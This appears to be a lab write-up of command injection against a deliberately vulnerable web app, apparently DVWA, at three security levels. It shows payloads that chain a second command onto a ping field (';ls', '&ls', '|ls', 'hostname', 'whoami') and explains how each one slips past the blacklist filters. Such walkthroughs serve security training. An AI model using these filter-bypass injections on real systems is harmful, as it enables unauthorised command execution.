# 1. Command Injection -> Low Security Level

```
For More information ->
```
![alt text](images/1.png)

## I wanna check with ;ls
```bash
┌──(robert㉿kali)-[~]
└─$ ping 127.0.0.2; ls       
PING 127.0.0.2 (127.0.0.2) 56(84) bytes of data.
64 bytes from 127.0.0.2: icmp_seq=1 ttl=64 time=0.170 ms
64 bytes from 127.0.0.2: icmp_seq=2 ttl=64 time=0.068 ms
64 bytes from 127.0.0.2: icmp_seq=3 ttl=64 time=0.079 ms
64 bytes from 127.0.0.2: icmp_seq=4 ttl=64 time=0.075 ms
64 bytes from 127.0.0.2: icmp_seq=5 ttl=64 time=0.069 ms
64 bytes from 127.0.0.2: icmp_seq=6 ttl=64 time=0.062 ms
^C
--- 127.0.0.2 ping statistics ---
6 packets transmitted, 6 received, 0% packet loss, time 5105ms
rtt min/avg/max/mdev = 0.062/0.087/0.170/0.037 ms
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
```
Here we go
![alt text](images/2.png)

So this was the low level 
![alt text](images/3.png)

# 2. Command Injection -> Medium Security Level
``` bash
With ;ls don't get any output so has to change the flow
Can see that ";" "&" will be replaced with " "
```
Source Code for medium lvl 
![alt text](images/4.png)
``` bash
Solution -> ping 127.0.0.2 &ls
```
![alt text](images/5.png)
![alt text](images/6.png)

``` bash
ping 127.0.0.2 & ls & hostname & whoami -> useful command
```
![alt text](images/7.png)

# 3. Command Injection -> High Security Level
![alt text](images/8.png)
>The blacklist is bigger and bigger 
![alt text](images/9.png)
>Function trim() which removes all the spaces was a good hint, just put them together
``` bash
ping 127.0.0.2|ls
```
![alt text](images/10.png)